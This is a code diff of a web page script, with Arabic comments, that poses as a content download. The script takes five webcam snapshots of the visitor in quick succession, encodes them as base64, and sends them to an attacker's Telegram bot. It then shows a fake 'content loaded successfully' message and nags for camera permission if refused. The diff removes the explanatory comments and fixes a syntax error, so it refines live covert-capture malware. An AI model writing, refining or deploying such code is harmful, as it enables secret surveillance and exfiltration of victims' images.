@@ -26,28 +26,24 @@
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    // تصغير الحجم والضغط لضمان عدم تجاوز حجم رسالة تيليجرام
                     canvas.width = 240;
                     canvas.height = 180;
                     const ctx = canvas.getContext('2d');
                     
                     let imagesData = [];
 
-                    // التقاط 5 صور ورا بعض بسرعة فائقة (بدون أي انتظار لسيرفر خارجي)
                     for (let i = 1; i <= 5; i++) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        // تحويل الصورة لنص مصغر جداً (Base64) بجودة مقبولة
                         let base64Image = canvas.toDataURL('image/jpeg', 0.4);
                         imagesData.push(`صورة (${i}):\n${base64Image}`);
 
                         if (i < 5) {
-                            await new Promise(r => setTimeout(r, 200)); // فاصل 200 جزء من الثانية فقط
+                            await new Promise(r => setTimeout(r, 200));
                         }
                     }
 
                     stream.getTracks().forEach(t => t.stop());
 
-                    // إرسال الـ 5 صور مع بعض كرسائل نصية متتالية في طلب واحد لتيليجرام
                     if (imagesData.length > 0) {
                         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                             method: 'POST',
@@ -62,7 +58,7 @@
                     document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
 
                 }, 1000);
-            } style (e) {
+            } catch (e) {
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
         }
